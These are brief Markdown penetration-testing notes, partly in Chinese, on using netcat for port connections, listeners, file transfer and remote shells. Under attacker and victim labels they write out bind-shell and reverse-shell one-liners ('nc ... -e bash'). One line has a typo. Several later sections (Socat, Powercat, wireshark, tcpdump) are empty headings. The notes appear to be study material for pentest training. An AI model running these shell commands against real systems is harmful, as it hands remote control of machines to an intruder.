# Practical Tools

一些渗透场景中, 目标环境中一般已有的工具

## Netcat

utility which reads and writes data across network connections, using TCP or UDP protocols

### Connecting to a TCP/UDP Port

- `n` skip dns name resolution
- `v` add some verbosity

```bash
nc -nv ip port
```

### Listening on a TCP/UDP Port

- `n` diable dns name resolution
- `l` create a listener
- `p` specify the listening port number
- `v` add some verbosity
- `e` specify filename to exec after connect
- `c` specify shell commands to exec after connect
- `k` forces nc to stay listening for another connection after its current connection is completed

```bash
nc -nlvp port
```

### Transferring Files with Netcat

1. use redirection

```bash
# receive
nc -nlvp port > file

# send
nc -nv ip port < file
```

### Remote Administration with Netcat

1. bind shell

```bash
# victim
nc -nlvp port -e bash

# attacker
nc -nv ip port
```

2. reverse shell

```bash
# attacker
nc -nlvp export 

# victim
nc -nv ip port -e bash

```

## Socat

## Powershell & Powercat

## wireshark

## tcpdump
